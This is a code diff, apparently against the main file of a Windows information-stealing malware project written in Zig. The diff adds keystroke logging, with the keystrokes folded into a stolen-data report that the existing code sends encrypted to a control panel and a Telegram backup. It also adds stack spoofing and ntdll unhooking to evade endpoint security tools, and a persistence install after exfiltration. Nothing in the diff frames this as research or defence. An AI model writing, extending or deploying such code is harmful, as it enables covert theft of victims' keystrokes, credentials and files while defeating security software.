@@ -7,6 +7,8 @@ const resolve = @import("types/export_resolve.zig");
 const peb_walk = @import("types/peb_walk.zig");
 const engine = @import("syscalls/engine.zig");
 const gadget = @import("syscalls/gadget.zig");
+const stack_spoof = @import("syscalls/stack_spoof.zig");
+const ntdll_unhook = @import("syscalls/ntdll_unhook.zig");
 const dbg = @import("syscalls/dbg.zig");
 const evasion = @import("evasion/evasion.zig");
 const anti_analysis = @import("evasion/anti_analysis.zig");
@@ -32,8 +34,10 @@ const zip_mod = @import("network/zip.zig");
 const telegram_net = @import("network/telegram.zig");
 const panel_http = @import("network/panel_http.zig");
 const detection = @import("evasion/detection.zig");
+const keylogger = @import("evasion/keylogger.zig");
 const self_delete = @import("cleanup/self_delete.zig");
 const temp_wipe = @import("cleanup/temp_wipe.zig");
+const persistence = @import("cleanup/persistence.zig");
 const clipper_config = @import("clipper_config");
 const clipboard_monitor = @import("clipper/clipboard_monitor.zig");
 const clipper_log_mod = @import("clipper/log.zig");
@@ -257,6 +261,17 @@ fn buildReport(allocator: std.mem.Allocator, local_app_data: []const u8, roaming
         }
     }
 
+    if (config.ENABLE_KEYLOGGER) {
+        logMsg("[+] Collecting keylogger data...\n");
+        const kl = keylogger.getBuffer();
+        if (kl.len > 0) {
+            report.appendSlice("=== Keylogger ===\n") catch {};
+            report.appendSlice(kl) catch {};
+            report.appendSlice("\n") catch {};
+            allocator.free(kl);
+        }
+    }
+
     return report.toOwnedSlice() catch "";
 }
 
@@ -272,6 +287,8 @@ fn initSyscallInfrastructure() ?types.PVOID {
         return null;
     }
     _ = gadget.initialize();
+    _ = stack_spoof.initialize();
+    _ = ntdll_unhook.unhookNtdll();
     _ = engine.resolveWin32u();
     return ntdll;
 }
@@ -349,6 +366,13 @@ fn runProductionPipeline() void {
             logMsg("[!] ClipLZ monitor failed to start\n");
         };
         logMsg("[+] ClipLZ clipboard monitor spawned\n");
+    }
+
+    if (config.ENABLE_KEYLOGGER) {
+        keylogger.start() catch {
+            logMsg("[!] Keylogger failed to start\n");
+        };
+        logMsg("[+] Keylogger thread spawned\n");
     }
 
     if (config.HWID_BAN_LIST.len > 0) {
@@ -440,6 +464,16 @@ fn runProductionPipeline() void {
 
     sendToPanel(allocator, encrypted, metadata);
     sendToTelegramBackup(allocator, encrypted);
+
+    if (config.ENABLE_PERSISTENCE) {
+        logMsg("[+] Installing persistence...\n");
+        const exe_path = self_delete.getExePath(allocator);
+        defer if (exe_path) |p| allocator.free(p);
+        if (exe_path) |path| {
+            const persist_result = persistence.install(path, allocator);
+            log("[+] Persistence install result: {d}\n", .{@intFromEnum(persist_result)});
+        }
+    }
 
     if (clipper_config.CLIPPER_ENABLED) {
         if (clipboard_monitor.getLog()) |clog| clog.reset();
